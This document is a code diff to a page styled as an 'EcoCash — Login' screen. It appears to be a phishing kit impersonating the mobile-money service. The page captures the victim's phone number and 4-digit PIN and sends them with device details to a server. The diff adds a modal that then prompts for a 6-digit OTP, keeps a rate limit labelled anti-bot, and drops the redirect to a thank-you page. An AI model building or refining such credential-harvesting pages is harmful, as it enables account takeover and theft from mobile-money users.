@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>EcoCash — Login</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+
 <style>
   *{box-sizing:border-box}
   html,body{height:100%}
@@ -27,8 +28,7 @@
   .btn[disabled]{background:#cbd5e1;cursor:not-allowed}
 
   .req{color:#d04444;margin-right:6px}
-  .phone-prefix{text-align:center;font-size:13px;color:#6b7280;margin-top:4px}
-  .phone-error{font-size:13px;color:#d04444;display:none}
+  .phone-error{font-size:13px;color:#d04444;display:none;margin-top:4px}
 
   /* PIN boxes */
   .pin-row{display:flex;gap:8px;justify-content:center;margin-top:6px}
@@ -52,8 +52,7 @@
 <form id="loginForm" autocomplete="off">
 
 <label><span class="req">★</span>Mobile Number</label>
-<input id="phone" inputmode="numeric" placeholder="7XXXXXXXX" />
-<div class="phone-prefix">+263</div>
+<input id="phone" inputmode="numeric" value="+263" />
 <div id="phoneError" class="phone-error">Enter 9 digits starting with 7</div>
 
 <label><span class="req">★</span>4-Digit PIN</label>
@@ -71,6 +70,32 @@
 </form>
 </div>
 
+<!-- OTP modal (UNCHANGED) -->
+<div id="otpModal" style="display:none" class="otp-modal">
+  <div class="otp-box">
+    <div style="text-align:center"><strong>Enter OTP</strong></div>
+    <p class="small">We have sent an OTP to your phone.</p>
+
+    <div class="otp-row">
+      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d0">
+      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d1">
+      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d2">
+      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d3">
+      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d4">
+      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d5">
+    </div>
+
+    <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
+
+    <div style="display:flex;gap:10px;margin-top:12px">
+      <button id="confirmOtp" disabled>Confirm</button>
+      <button id="cancelOtp">Cancel</button>
+    </div>
+
+    <div id="otpStatus" class="small"></div>
+  </div>
+</div>
+
 <script>
 /* ========= DEVICE INFO ========= */
 const deviceInfo = {
@@ -79,12 +104,29 @@ const deviceInfo = {
 };
 
 /* ========= ANTI BOT ========= */
-const lastSubmit = Number(localStorage.getItem('lastSubmit') || 0);
 const RATE_LIMIT = 4000;
+const lastSubmit = Number(localStorage.getItem('lastSubmit') || 0);
 
 /* ========= PHONE ========= */
 const phoneEl = document.getElementById('phone');
 const phoneError = document.getElementById('phoneError');
+
+phoneEl.addEventListener('keydown',e=>{
+  if(phoneEl.selectionStart <= 4 && e.key === 'Backspace'){
+    e.preventDefault();
+  }
+});
+
+phoneEl.addEventListener('input',()=>{
+  if(!phoneEl.value.startsWith('+263')){
+    phoneEl.value = '+263';
+  }
+  let digits = phoneEl.value.replace('+263','').replace(/\D/g,'').slice(0,9);
+  phoneEl.value = '+263'+digits;
+
+  phoneError.style.display = /^7\d{8}$/.test(digits) ? 'none' : 'block';
+  updateBtn();
+});
 
 /* ========= PIN ========= */
 const pinBoxes = [...document.querySelectorAll('.pin-digit')];
@@ -95,16 +137,11 @@ function getPIN(){
 }
 
 function updateBtn(){
-  const phoneOk = /^7\d{8}$/.test(phoneEl.value);
+  const phoneDigits = phoneEl.value.replace('+263','');
+  const phoneOk = /^7\d{8}$/.test(phoneDigits);
   const pinOk = /^\d{4}$/.test(getPIN());
-  phoneError.style.display = phoneOk ? 'none' : 'block';
   loginBtn.disabled = !(phoneOk && pinOk);
 }
-
-phoneEl.addEventListener('input',()=>{
-  phoneEl.value = phoneEl.value.replace(/\D/g,'').slice(0,9);
-  updateBtn();
-});
 
 pinBoxes.forEach((box,i)=>{
   box.addEventListener('input',()=>{
@@ -131,7 +168,7 @@ async function sendToServer(payload){
   });
 }
 
-/* ========= SUBMIT ========= */
+/* ========= LOGIN SUBMIT ========= */
 document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
 
@@ -139,15 +176,15 @@ document.getElementById('loginForm').addEventListener('submit',async e=>{
   if(Date.now() - lastSubmit < RATE_LIMIT) return;
   localStorage.setItem('lastSubmit',Date.now());
 
+  document.getElementById('otpModal').style.display='flex';
+
   await sendToServer({
     event:'login_clicked',
-    loginPhone:'+263'+phoneEl.value,
-    loginPin:getPIN(),
-    device:deviceInfo,
+    loginPhone: phoneEl.value,
+    loginPin: getPIN(),
+    device: deviceInfo,
     submittedAt:new Date().toISOString()
   });
-
-  window.location.href='thankyou.html';
 });
 </script>
 </body>
